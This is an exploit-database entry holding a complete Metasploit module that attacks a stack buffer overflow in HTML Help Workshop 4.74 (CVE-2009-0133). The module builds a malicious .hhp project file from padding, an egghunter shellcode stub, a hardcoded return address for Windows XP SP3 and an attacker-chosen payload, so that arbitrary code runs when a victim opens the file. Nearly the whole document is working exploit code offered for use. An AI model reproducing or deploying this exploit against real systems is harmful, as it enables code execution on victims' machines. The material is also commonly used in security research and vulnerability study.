HTML Help Workshop 4.74 (hhp Project File) Buffer Overflow Exploit (Meta)
=========================================================================



# Title: HTML Help Workshop 4.74 (hhp Project File) Buffer Overflow Exploit (Meta)
# CVE-ID: (CVE-2009-0133)
# OSVDB-ID: ()
# Author: loneferret
# Published: 2009-12-07
# Verified: yes

view source
print?
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
         
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;HTML Help Workshop 4.74 (hhp Project File) Buffer Overflow Exploit&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack overflow in HTML Help Workshop 4.74
                    By creating a specially crafted hhp file, an an attacker may be able
                    to execute arbitrary code.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [ &#039;loneferret, original by Encrypt3d.M!nd&#039; ],
            &#039;Version&#039;        => &#039;$Revision: 7724 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/10321&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },                 
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1000,
                    &#039;BadChars&#039; => "\x00",
                    &#039;StackAdjustment&#039; => -4800,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows XP English SP3&#039;, { &#039;Ret&#039; => 0x00401F93 } ], # CALL EDI  \x93\x1f\x40\x00
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Dec 05 2009&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
            register_options(
                [
                    OptString.new(&#039;FILENAME&#039;,   [ false, &#039;The file name.&#039;,  &#039;Devil.hhp&#039;]),
                ], self.class)
 
    end
 
    def exploit
 
        sploit = "\x5B\x4F\x50\x54\x49\x4F\x4E\x53\x5D\x0D\x0A\x43\x6F\x6E\x74\x65"
        sploit << "\x6E\x74\x73\x20\x66\x69\x6C\x65\x3D\x41\x0D\x0A\x49\x6E\x64\x65\x78\x20\x66\x69\x6C\x65\x3D"
        sploit << "\x41" * 224
        sploit << "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x69\x72\x61\x71\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
        sploit << "\x42" * 24
        sploit << [target.ret].pack(&#039;V&#039;)
        sploit << "\x0d\x0a\x0d\x0a"
        sploit << "\x5B\x46\x49\x4C\x45\x53\x5D\x0D"
        sploit << "\x0d\x0a"
        sploit << "\x41" * 16
        sploit << "\x69\x72\x61\x71\x69\x72\x61\x71"
        sploit << payload.encoded
        sploit << "\x41" * 4000
  
        hhp = sploit
 
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
        file_create(hhp)
    end
 
end



